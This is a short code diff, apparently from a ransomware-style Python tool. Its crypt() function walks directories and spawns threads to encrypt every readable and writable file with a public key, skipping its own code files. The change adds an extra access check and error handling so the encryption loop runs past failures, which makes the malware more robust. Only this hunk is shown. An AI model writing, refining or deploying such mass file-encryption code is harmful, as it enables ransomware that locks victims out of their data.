@@ -89,8 +89,11 @@ def crypt():
             for filename in filenames:
                 if protect_Code_Files(filename) == False:
                     file = os.path.join(dirpath, filename)
-                    if os.access(file, os.W_OK):
-                        Thread(target=encrypt_file, args=(file, pubkey)).start()
+                    if os.access(file, os.W_OK) and os.access(file, os.R_OK):
+                        try:
+                            Thread(target=encrypt_file, args=(file, pubkey)).start()
+                        except:
+                            print("ignoring error on crypting this file : ", file)
                     else:
                         print("access denied to this file : ", file)
                     
